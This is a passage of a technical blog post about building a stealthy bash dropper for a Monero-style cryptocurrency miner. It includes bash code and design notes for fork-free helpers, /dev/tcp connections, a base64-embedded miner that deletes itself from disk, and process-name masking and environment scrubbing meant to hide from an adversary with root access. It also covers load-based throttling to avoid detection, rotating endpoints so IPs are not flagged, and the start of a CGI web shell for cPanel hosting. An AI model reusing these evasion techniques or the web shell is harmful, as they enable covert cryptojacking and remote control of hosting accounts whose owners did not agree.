    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span>
    <span class=hljs-built_in>unset</span> <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>
    <span class=hljs-built_in>eval</span> <span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span>
    <span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Leverage pipes to create anonymous file descriptors, these don't behave exactly like file descriptors but they are good enough for <a href=https://en.wikipedia.org/wiki/Inter-process_communication>IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span>
<span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span>
    <span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span>
    <span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span>
    <span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Sleeping without forking, by abusing the timeout functionality of the read builtin, it uses a dedicated file descriptor and we must ensure that it is available to avoid termination.<p>There are functions like <code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> are used to monitor system usage, these all make use of the linux <code>/proc</code> files without tools like <code>ps</code>, so no forking, all pure bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span> <span class=hljs-built_in>unset</span>
    <span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
        <span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
        <span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>
        <span class=hljs-keyword>fi</span>

        <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span>
            <span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span>
        <span class=hljs-keyword>fi</span>

        <span class=hljs-built_in>log</span> <span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span>
        <span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> <span class=hljs-comment>## only the variable, not functions</span>
        <span class=hljs-built_in>eval</span> <span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span> <span class=hljs-comment># 2>/dev/null</span>
        <span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span>
    <span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span> <span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span> <span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span> <span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Coprocesses are available since bash <code>v4</code>, they are like jobs except they have a name and their own file descriptors.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span>
<span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span>
            <span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span>
                <span class=hljs-keyword>case</span> <span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span> <span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span> <span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span>
            <span class=hljs-keyword>fi</span>
    <span class=hljs-keyword>done</span>
}</code></pre><p>We are writing a daemon, which is a long lived process, and we are using many file descriptors, we really want to do some cleanups to avoid incurring in <a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf>ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span>
<span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span> <span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span> <span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span> <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> <span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span> <span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span> <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> <span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span> <span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span>
        <span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span> <span class=hljs-string>"<span class=hljs-variable>$l</span>"</span> <span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span> <span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span>
            <span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>This function relies on <a href=https://ipinfo.io/>ipinfo</a> to determine the region of the worker, which allows to tune some region dependent logic, <a href=\assets/posts/geoip.json>geoip.json</a> groups countries into regions, since we want the top level region, and are not interested in the specific country.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span>
<span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span> <span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span>
<span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span> <span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span> <span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span> <span class=hljs-variable>$port</span> <span class=hljs-variable>$conn_socket</span>
    <span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span>
        <span class=hljs-comment># close connection</span>
        <span class=hljs-built_in>eval</span> <span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span>
    <span class=hljs-keyword>else</span>
        <span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span>
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Bash has support for tcp connections, by having an abstraction over <code>/dev/tcp</code> (also for udp, but most it seems to be usually disabled at build time, so you can't rely on it). These files are a bash thing, they are not part of the linux <code>/dev</code> tree.<p>Worth mentioning also a locking system to handle concurrency between bash jobs. To allow multiple jobs to work with locks they all need to share a file descriptor, so our <code>locker</code> which is also a job, has to be started before other jobs wishing to use the lock. The locker simply reads on <code>stdin</code> waiting for locking requests, responding on <code>stdout</code> depending on the current boolean state stored in a variable. I don't guarantee that this approach is race free, but seems to work decently, on the other hand, I have found file descriptors to not be very reliable, as I suspect there are some buffers that do not get flushed somewhere down the <em>pipes</em> and eventually hitting deadlocks (which means that you cannot rely on the locker giving you an answer all the times).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span>
<span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span> <span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span>
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span> <span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span>
        <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span>
        <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span>
    <span class=hljs-keyword>done</span>
    <span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span> <span class=hljs-built_in>echo</span> <span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span> <span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span>
    <span class=hljs-keyword>done</span>
    <span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span>
<span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span> <span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span>
        <span class=hljs-keyword>case</span> <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> <span class=hljs-keyword>in</span>
            <span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span> <span class=hljs-variable>${n/=*}</span>"</span>
        <span class=hljs-keyword>esac</span>
    <span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span>
    <span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Clean up your garbage...complex bash programs end up using many variables, and if you abuse the global space it gets bloaty. If you are spawning shell jobs, they inherit all the environment (which is effectively duplicated, not shared), you can quickly end up with bash eating <code>100M</code> of memory, not nice. Also we really want to be low profile. In our deployment scenario, the adversary <sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> can potentially have root access and complete information about our processes <sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , and you know...every process holds information about the full command that started it, and the exported environment variables.<h2 id=configuration><a class=header-anchor href=#configuration>Configuration</a></h2><p>Once we have our environment, and our tools, we have to tune our miner for the machine it is running on, configuration steps in pseudo code:<ul><li><p>process name for the miner</p><li><p>host infos (ram/cores/caches/<code>ENV_VARS</code>)</p><li><p>configuration version</p><li><p><code>worker_id</code> for the miner (from ip and host)</p><li><p>ip/port for the connection</p></ul><p>Choosing a name for the process is required to <em>hide</em> the fact that we are running a miner, but we are not just renaming our binary, we have a list of <strong>masks</strong> for potential candidates (a plain text file where each line is a mask):<ul><li><p>pick a mask at random</p><li><p>shuffle the elements of the tail of the string (all except the first) to get a diverse process command. Now we have a string looking like <code>cmd --arg2 --arg1 --arg3</code>. This is our miner mask, we run the binary <em>without</em> arguments, but it looks like we started a command <code>cmd</code> with arguments <code>--arg1 --arg2 --arg3</code>. Spaces and dashes are allowed in file names, so it is fine to run a binary named like this, it doesn't seem linux discerns between the executable and the arguments when storing the process commands.</p> <p>The miner configuration is automatically loaded from <code>$PWD</code>.</p></ul><h3 id=hashrate><a class=header-anchor href=#hashrate>Hashrate</a></h3><p>, with time, the upstream miner got many <strong>automatic tuning</strong> features, so it made part of my scripts redundant, but the difference between upstream and downstream here is that the upstream goal is to maximize <em>performance</em>, while our goal is to maximize <em>efficiency and obfuscation</em>, we do not want to overtake the system, we want to leech a little bit without service disruption. <sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>For this, we need a more granular understanding of the environment, the <code>l2/l3</code> cache structure of the processor, ram, and cores, and current processor <em>average</em> load and cpu <em>usage</em>. I attempted to build a <a href=https://en.wikipedia.org/wiki/Finite-state_machine>state machine</a> in bash that would start from the bare minimum and try different configurations slowly settling on the average best. It was a <strong>huge</strong> waste of effort littered with <a href=https://en.wikipedia.org/wiki/Technical_debt>technical debt</a> that went bankrupt very quickly and was mostly discarded, with just remnants lingering in the codebase.<p>Frack all this auto tuning jumbo, we just made the miner sleep depending on host usage/load, this required miner modifications to <code>sleep</code> between threads yields, and a few fixes to the configuration watchdog <sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup>, which would allow us to reload the sleeping amount at runtime. The logic is much more simplified and looks like this:<ul><li><p>if usage is above/below $TARGET_USAGE (± margin of error) increase/decrease sleep</p><li><p>if average load within <code>1m</code> is above/below $TARGET_LOAD pause/resume mining</p></ul><h3 id=connection><a class=header-anchor href=#connection>Connection</a></h3><p>In our bash roundup we showed utilities for connection. Why do we need these? Because we need diversity; simply hard coding an endpoint into the configuration won't last long, when something looks suspicious, and has network activity, IPs are flagged.<p>At the start we experimented with a couple of methods:<ul><li><p>using <a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains>proxychains</a> to overload the miner network calls, but it required the miner to be built with dinamic libraries, and you had to ship them with the payload, so it was impractical.</p><li><p>running a <a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost>forward tunnel</a> side by side with the miner: this had a lot of configuration overhead, as now we were configuring two processes on each deployment, which amounted to more bugs.</p></ul><p>At the end we settled with just shipping a list of endpoints, stored in an bash variables, picking one at random. Connections were of course encrypted. What are these endpoints? Forwarders to the proxy which would handle the miners jobs.</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>Why do we need a <a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy>mining proxy</a>? I never really went past ~100 concurrent connections, so a proxy was not really necessary for network load, but it was convenient for negotiating the hashing algorithm, and to provide different difficulty targets to different miners, to prevent miners from working on <strong>difficulty</strong> targets that would take them too much time to complete and avoid the risk of wasting computation on unfinished jobs. <sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> The pool software also required a few modifications as it was happily advertising to be a proxy on plain http requests...<em>that had to be timed-out</em>, and a fork added access control so we based our mods on that. <sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json>Editing json</a></h3><p>Applying modifications to a json file with just bash we got by with some env var substitution, and some regex. Initially we were relying on an <code>envsubst</code> binary to apply variables, then we went full bash <sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> with this logic:<ul><li><p>read config template</p><li><p>replace all quotes with a very esoteric string (like <code>_#_#</code>)</p><li><p><code>eval</code> the template</p><li><p>replace all the esoteric occurrences back with quotes</p></ul><p>Apart from avoiding sub processes, another advantage is that we get complete bash capabilities in our templates. For reading and writing without templates, we have to rely on bash regex capabilities:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span>
<span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span>
		<span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span>
			<span class=hljs-built_in>break</span>
		<span class=hljs-keyword>fi</span>
	<span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span>
<span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span>
		<span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span> <span class=hljs-string>'%s'</span> <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span> <span class=hljs-string>'%s'</span> <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span>
			<span class=hljs-built_in>break</span>
		<span class=hljs-keyword>fi</span>
	<span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>This only allows us to edit single lines, for multi-line entries it just considers the first line..but it is good enough for our use case.<h2 id=runtime><a class=header-anchor href=#runtime>Runtime</a></h2><p>What does our runtime look like? We have a main bash process that executes the main loop, then the miner sub-process, the cpu monitor sub-process, the locker and the tuner. That's almost a handful.<p>First we want to ensure that if something goes wrong, we don't leave a mess, this means that we use a bash trap to perform cleanups on termination<pre><code class="bash hljs"><span class=hljs-built_in>trap</span> <span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> unsets the trap to prevent recursion. The trap kills all the jobs and removes the working environment.<p>It's time to start the miner, which is stored as a bash variable in base64 encoding. We dump it on the filesystem, then we dump the config, execute the miner, and remove both the miner and the config. On linux you can remove the executable of a running process, (on windows this is not allowed). <sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> When the miner is running, on the filesystem there is just a <code>.. /</code> directory with a <code>b64</code> link in it.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span>
<span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span>
    <span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span>
        <span class=hljs-built_in>log</span> <span class=hljs-string>"gobbling in array"</span>
        <span class=hljs-built_in>eval</span> <span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span> <span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span>
        <span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span>
    <span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span>
<span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span>
        <span class=hljs-keyword>if</span> <span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span> <span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span>
            <span class=hljs-built_in>return</span>
        <span class=hljs-keyword>else</span>
            <span class=hljs-comment># log "dumping from array"</span>
            <span class=hljs-built_in>eval</span> <span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span>
        <span class=hljs-keyword>fi</span>
        <span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> <span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span> <span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span>
             <span class=hljs-built_in>return</span>
         <span class=hljs-keyword>else</span>
             <span class=hljs-comment># log "dumping from array"</span>
             <span class=hljs-built_in>eval</span> <span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span>
         <span class=hljs-keyword>fi</span>
         <span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>A maddening quirk encountered with bash while encoding the miner is that assigning a variable with a subshell with quotes <code>myvar="$(something)"</code> causes a permanent increase in memory usage, this was hard to debug and haven't really found the reason why behaves like this, anyway the assignment has to be unquoted. Decoding instead is done with <em>herestrings</em> which is an abstraction over temporary files, the variable is dumped into a file that is then piped back into the process.<p>The miner long running loop:<ul><li><p>while true</p> <ul><li><p>stop miner</p><li><p>remove config</p><li><p>start miner</p><li><p>while true</p> <ul><li><p>start daemon</p> <ul><li><p>while miner is running</p> <ul><li><p>read the output from miner</p><li><p>choose miner action based on output line</p></ul></ul><li><p>if miner is not running: break</p></ul><li><p>sleep</p></ul></ul><p>The output line is matched against some regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>The daemon handles cases where<ul><li><p>the connection to the endpoint gives errors (pick a new random endpoint)</p><li><p>the hashing algorithm changes (adjust sleep time and ad-hoc configurations)</p><li><p>miner problems (restart the miner).</p></ul><p>For a while there was support for the command and control dashboard, which allowed to trigger manual restarts, however since its usage was minimal it was discarded, and its endpoints were replaced with an alternative pool connection, also the restart process was unstable, complex...another instance of tech debt. However it allowed to re-fetch an updated payload and re-setup all configurations on the fly, which was pretty cool, the ultimate trampoline.<h2 id=debugging><a class=header-anchor href=#debugging>Debugging</a></h2><p>There are three main utilities<ul><li><p>enable/disable tracing around code blocks (we don't want to trace a b64 encoded binary in a variable..)</p><li><p>a simple function for formatting logs</p><li><p>a flag that would activate verbose logging at runtime whenever the miner was started.</p> <ul><li><p>does the file <code>.debug</code> exist?</p> <ul><li><p>enable verbose logging</p></ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments>Target deployments</a></h2><p>This setup has been tested on 3 kind of hosts:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms>Self hosted containers or VMs</a></h3><p>Many hosting providers don't like mining since CPU resources tend to be shared among multiple users, and mining software can easily slow down a host node impacting performance for the rest of the users. This can true even if CPU user time is unlimited, because hashing algorithms can saturate all the caching layers of the CPU if the cache is shared among all the CPU cores.<p>We would like to use our <em>fair</em> share of resources without getting banned, that's a good use-case for our stealth dropper since it is host usage aware, which means it <em>should</em> stay kind of within [AUP]. There is no extra steps when dealing with self hosted deployments, just the launcher script, maybe added to the boot sequence or launched manually.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting>cPanel based web hosting</a></h3><p>Web hosting subscriptions plans are mostly offered through [cPanel]. Again here we are using personal subscription plans which have reasonable resource limits, on the other hand any free plan has ridiculous limits <sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup>. cPanel allows you to define handlers for different file extensions, this allows us to execute shell scripts through the <a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface>cgi</a> with an http request against a shell script uploaded on the server. These kind of interfaces are what web-shells look like <sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup>. A simple bash web shell<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span>
<span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
